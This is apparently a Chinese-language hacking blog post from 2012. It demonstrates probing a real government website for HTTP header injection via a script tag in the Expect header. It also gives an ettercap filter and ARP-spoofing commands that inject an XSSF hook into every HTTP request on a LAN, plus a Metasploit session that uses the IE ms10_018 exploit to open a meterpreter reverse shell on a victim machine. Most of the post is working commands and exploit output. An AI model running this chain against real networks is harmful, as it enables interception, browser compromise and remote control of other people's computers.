title: "HTTP Header Injection "
date: 2012-08-02 14:46:01
tags:
id: 99
comment: false
---

正常http头
```

GET / HTTP/1.1
Host: www.scjj.gov.cn
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
Accept: */*

```

在http头中加入异常处理Expect查看页面变化情况来确定是否存在漏洞
```

GET / HTTP/1.1
Expect: &lt;script&gt;alert(12345)&lt;/script&gt;
Host: www.scjj.gov.cn
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
Accept: */*

```

[![](http://lpcdma.com/wp-content/uploads/2012/08/20120802142821.jpg "20120802142821")](http://lpcdma.com/wp-content/uploads/2012/08/20120802142821.jpg)

今天遇到一个蛋疼的问题，xssf只能用一次，第二次load xssf出现一下错误
Failed to load plugin from /opt/metasploit/msf3/plugins/xssf: uninitialized constant Msf::Xssf
从新安装后解决
svn export http://xssf.googlecode.com/svn/trunk/ XSSF
cd XSSF/
cp -rf * /opt/metasploit/msf3/
这样的话我每用一次都的这样操作一次，非常麻烦。

```

root@bt:~/Desktop# msfconsole -y msf.yml
msf &gt; load xssf 
[-] Your Ruby version is 1.9.2\. Make sure your version is up-to-date with the last non-vulnerable version before using XSSF!
[+] Please use command 'xssf_urls' to see useful XSSF URLs
[*] Successfully loaded plugin: xssf
msf &gt; xssf_urls 
[+] XSSF Server          : 'http://10.1.1.137:8888/'            or 'http://&lt;PUBLIC-IP&gt;:8888/'
[+] Generic XSS injection: 'http://10.1.1.137:8888/loop'        or 'http://&lt;PUBLIC-IP&gt;:8888/loop'
[+] XSSF test page       : 'http://10.1.1.137:8888/test.html' or 'http://&lt;PUBLIC-IP&gt;:8888/test.html'

[+] XSSF Tunnel Proxy   : 'localhost:8889'
[+] XSSF logs page      : 'http://localhost:8889/gui.html?guipage=main'
[+] XSSF statistics page: 'http://localhost:8889/gui.html?guipage=stats'
[+] XSSF help page      : 'http://localhost:8889/gui.html?guipage=help'

```


写一个简单的ettercap规则在http头中插入Expect
```

if (ip.proto == TCP &amp;&amp; tcp.dst == 80){
replace(&quot;Accept-Encoding&quot;,&quot;Expect: &lt;script src=&quot;http://10.1.1.137:8888/loop&quot;&gt;&lt;/script&gt;&quot;);
}

```

关于ettercap规则和使用http://www.0x50sec.org/wp-content/uploads/2010/03/linux520.ppt

编译规则并启用ettercap进行arp欺骗并修改数据包
root@bt:/usr/local/share/ettercap# etterfilter fuck.filter -o fuck.ef
root@bt:/usr/local/share/ettercap# ettercap -T -q -i eth0 -F fuck.ef -M ARP // // -P autoadd

局域网中的所有http头都将被更改，要是只想更改某个目标，指定http头，
就要使用更复杂的ettercap规则。

目标机是XP
```

msf &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
msf &gt; use exploit/windows/browser/ms10_018_ie_behaviors
msf  exploit(ms10_018_ie_behaviors) &gt; show options 

Module options (exploit/windows/browser/ms10_018_ie_behaviors):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   SRVHOST     0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT     8080             yes       The local port to listen on.
   SSL         false            no        Negotiate SSL for incoming connections
   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)
   SSLVersion  SSL3             no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)
   URIPATH                      no        The URI to use for this exploit (default is random)

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique: seh, thread, process, none
   LHOST                      yes       The listen address
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   (Automatic) IE6, IE7 on Windows NT, 2000, XP, 2003 and Vista

msf  exploit(ms10_018_ie_behaviors) &gt; set lhost 10.1.1.137
lhost =&gt; 10.1.1.137
msf  exploit(ms10_018_ie_behaviors) &gt; exploit 
[*] Exploit running as background job.

[*] Started reverse handler on 10.1.1.137:4444 
msf  exploit(ms10_018_ie_behaviors) &gt; [*] Using URL: http://0.0.0.0:8080/2XVZcmbFPAw9Jc
[*]  Local IP: http://10.1.1.137:8080/2XVZcmbFPAw9Jc
[*] Server started.
msf  exploit(ms10_018_ie_behaviors) &gt; 
msf  exploit(ms10_018_ie_behaviors) &gt; 
msf  exploit(ms10_018_ie_behaviors) &gt; job
[-] Unknown command: job.
msf  exploit(ms10_018_ie_behaviors) &gt; jobs

Jobs
====

  Id  Name
  --  ----
  0   Exploit: windows/browser/ms10_018_ie_behaviors

msf  exploit(ms10_018_ie_behaviors) &gt; xssf_exploit 
[-] Wrong arguments: [JobID] must be an Integer.
[-] Wrong arguments: xssf_exploit [VictimIDs] [JobID]
[-] Use MSF 'jobs' command to see running jobs
msf  exploit(ms10_018_ie_behaviors) &gt; xssf_victims 

Victims
=======

id  xssf_server_id  active  ip          interval  browser_name       browser_version  cookie
--  --------------  ------  --          --------  ------------       ---------------  ------
10  1               true    10.1.1.134  5         Internet Explorer  6.0              YES

[*] Use xssf_information [VictimID] to see more information about a victim
msf  exploit(ms10_018_ie_behaviors) &gt; xssf_exploit 10 0
[*] Searching Metasploit launched module with JobID = '0'...
[+] A running exploit exists: 'Exploit: windows/browser/ms10_018_ie_behaviors'
[*] Exploit execution started, press [CTRL + C] to stop it !

[+] Remaining victims to attack: [10 (1)] 

[*] 10.1.1.137       ms10_018_ie_behaviors - Sending Internet Explorer DHTML Behaviors Use After Free (target: IE 6 SP0-SP2 (onclick))...

[+] Code 'Exploit: windows/browser/ms10_018_ie_behaviors' sent to victim '10'
[+] Remaining victims to attack: NONE
[*] 10.1.1.137       ms10_018_ie_behaviors - Sending Internet Explorer DHTML Behaviors Use After Free (target: IE 6 SP0-SP2 (onclick))...
[*] Sending stage (752128 bytes) to 10.1.1.134
[*] Meterpreter session 1 opened (10.1.1.137:4444 -&gt; 10.1.1.134:1066) at 2012-08-02 14:13:59 +0800
[*] Session ID 1 (10.1.1.137:4444 -&gt; 10.1.1.134:1066) processing InitialAutoRunScript 'migrate -f'
[*] Current server process: iexplore.exe (2372)
[*] Spawning notepad.exe process to migrate to
[+] Migrating to 3300
[+] Successfully migrated to process 

^C[-] Exploit interrupted by the console user
msf  exploit(ms10_018_ie_behaviors) &gt; sessions -i

Active sessions
===============

  Id  Type                   Information  Connection
  --  ----                   -----------  ----------
  1   meterpreter x86/win32  Xxx @ X     10.1.1.137:4444 -&gt; 10.1.1.134:1066 (10.1.1.134)

msf  exploit(ms10_018_ie_behaviors) &gt; sessions -i 1
[*] Starting interaction with 1...

meterpreter &gt; sysinfo
Computer        : X
OS              : Windows XP (Build 2600, Service Pack 2).
Architecture    : x86
System Language : zh_CN
Meterpreter     : x86/win32

```
